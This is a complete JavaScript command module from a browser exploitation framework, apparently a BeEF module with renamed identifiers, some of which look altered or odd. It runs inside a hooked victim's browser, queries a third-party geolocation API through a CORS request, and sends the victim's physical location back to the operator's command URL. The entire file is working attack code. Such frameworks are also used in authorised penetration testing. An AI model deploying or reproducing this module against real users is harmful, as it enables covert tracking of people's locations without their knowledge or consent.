//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
  var url = "<%= @api_url %>";
  var timeout = 10000;

  if (!server.browser.hasCors()) {
    server.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=Browser does not support CORS', server.are.status_error());
    return;
  }

  server.net.cors.request('GET', url, '', timeout, function(response) {
    server.debug("[Get Physical Location (Third-Party] " + response.body);
    server.net.send("<%= @command_url %>", <%= @command_id %>, "result=" + response.body, server.are.status_success());
  });
});
